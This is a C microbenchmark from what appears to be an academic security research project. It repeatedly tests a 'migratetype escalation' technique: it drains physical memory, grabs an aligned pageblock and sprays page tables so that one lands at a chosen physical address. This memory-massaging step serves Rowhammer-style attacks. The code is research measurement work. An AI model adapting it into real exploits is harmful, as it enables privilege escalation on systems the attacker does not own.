/*
 * Copyright (C) 2025 Matej Bölcskei, ETH Zurich
 * Licensed under the GNU General Public License as published by the Free Software Foundation, version 3.
 * See LICENSE or <https://www.gnu.org/licenses/gpl-3.0.html> for details.
 * 
 * SPDX-License-Identifier: GPL-3.0-only
 */

#define _GNU_SOURCE

#include "microbenchmark.h"
#include "rubench_user.h"
#include "rubicon.h"

#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <unistd.h>

#define PAGE_SIZE 0x1000UL
#define PAGEBLOCK_SIZE 0x200000UL

#define ZONE_RESERVE 0xc0000000UL
#define REMAP_ADDRESS 0x200000000UL

#define TARGET_OFFSET 0x10000UL

#define NR_VMA_LIMIT 63000UL
#define PAGE_TABLE_BACKED_SIZE 0x200000UL
#define SPRAY_START 0x100000000UL

static int fd_spray;
static void *file_ptr;
static unsigned long file_phys;

static void *pageblock;

static void *target;
static unsigned long target_phys;

void open_spraying_file() {
  const char *buf = "ffffffffffffffff";

  fd_spray = open("/dev/shm", O_TMPFILE | O_RDWR, S_IRUSR | S_IWUSR);
  write(fd_spray, buf, 8);
  file_ptr = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE,
                  MAP_SHARED | MAP_POPULATE, fd_spray, 0);
  mlock(file_ptr, PAGE_SIZE);

  file_phys = rubench_va_to_pa(file_ptr);
}

void close_spraying_file() {
  munlock(file_ptr, PAGE_SIZE);
  munmap(file_ptr, PAGE_SIZE);
  close(fd_spray);
}

int spray_tables() {
  for (unsigned i = 0; i < NR_VMA_LIMIT; ++i) {
    void *addr = (void *)(SPRAY_START + PAGE_TABLE_BACKED_SIZE * i);
    if (mmap(addr, PAGE_SIZE, PROT_READ | PROT_WRITE,
             MAP_FIXED | MAP_SHARED | MAP_POPULATE, fd_spray,
             0) == MAP_FAILED) {
      printf("Failed to spray tables\n");
      exit(EXIT_FAILURE);
    }
  }

  return 0;
}

void unspray_tables() {
  for (unsigned i = 1; i < NR_VMA_LIMIT; ++i) {
    void *addr = (void *)(SPRAY_START + PAGE_TABLE_BACKED_SIZE * i);
    if (munmap(addr, PAGE_SIZE)) {
      printf("Failed to unspray tables\n");
      exit(EXIT_FAILURE);
    }
  }
}

void *get_page_block() {
  size_t drain_size = PAGE_SIZE * sysconf(_SC_AVPHYS_PAGES) - ZONE_RESERVE;

  void *drain = mmap(NULL, drain_size, PROT_READ | PROT_WRITE,
                     MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
  if (drain == MAP_FAILED) {
    printf("Failed to drain memory\n");
    exit(EXIT_FAILURE);
  }

  void *drain_end = (void *)((unsigned long)drain + drain_size - PAGE_SIZE);
  unsigned long drain_end_phys = rubench_va_to_pa(drain_end);

  void *aligned = (void *)((unsigned long)drain_end -
                           (drain_end_phys % PAGEBLOCK_SIZE) - PAGEBLOCK_SIZE);

  void *pageblock = mremap(aligned, PAGEBLOCK_SIZE, PAGEBLOCK_SIZE,
                           MREMAP_FIXED | MREMAP_MAYMOVE, REMAP_ADDRESS);

  munmap(drain, drain_size);

  unsigned long start_phys = rubench_va_to_pa(pageblock);
  unsigned long end_phys = rubench_va_to_pa(
      (void *)((unsigned long)pageblock + PAGEBLOCK_SIZE - PAGE_SIZE));

  if (start_phys % PAGEBLOCK_SIZE != 0 ||
      end_phys % PAGEBLOCK_SIZE != PAGEBLOCK_SIZE - PAGE_SIZE) {
    return MAP_FAILED;
  }

  return pageblock;
}

void pre_migratetype_escalation() {
  do {
    pageblock = get_page_block();
  } while (pageblock == MAP_FAILED);

  target = (void *)((unsigned long)pageblock + TARGET_OFFSET);
  mlock((void *)((unsigned long)target - PAGE_SIZE), 3 * PAGE_SIZE);
  target_phys = rubench_va_to_pa(target);
  open_spraying_file();
}

void microbenchmark_migratetype_escalation() {
  void *bait_ptr = (void *)((unsigned long)pageblock + PAGEBLOCK_SIZE / 2);
  migratetype_escalation(bait_ptr, 9, spray_tables);
  unspray_tables();

  munlock(target, PAGE_SIZE);
  block_merge(target, 0);
  mmap((void *)(SPRAY_START + PAGEBLOCK_SIZE), PAGE_SIZE,
       PROT_READ | PROT_WRITE, MAP_FIXED | MAP_SHARED | MAP_POPULATE, fd_spray,
       0);
}

int post_migratetype_escalation() {
  unsigned long value = rubench_read_phys(target_phys);

  printf("Pageblock physical address: %lx\n", target_phys);
  printf("File physical address: %lx\n", file_phys);
  printf("Value read from target: %lx\n", value);

  munmap((void *)SPRAY_START, PAGE_SIZE);
  munmap((void *)(SPRAY_START + PAGEBLOCK_SIZE), PAGE_SIZE);
  close_spraying_file();

  munlock((void *)((unsigned long)target - PAGE_SIZE), 3 * PAGE_SIZE);
  munmap(pageblock, PAGEBLOCK_SIZE);
  return (value & 0xFFFFFFFFF000) != file_phys;
}

int main(void) {
  rubench_open();

  run_microbenchmark(100, pre_migratetype_escalation,
                     microbenchmark_migratetype_escalation,
                     post_migratetype_escalation);

  rubench_close();
  return 0;
}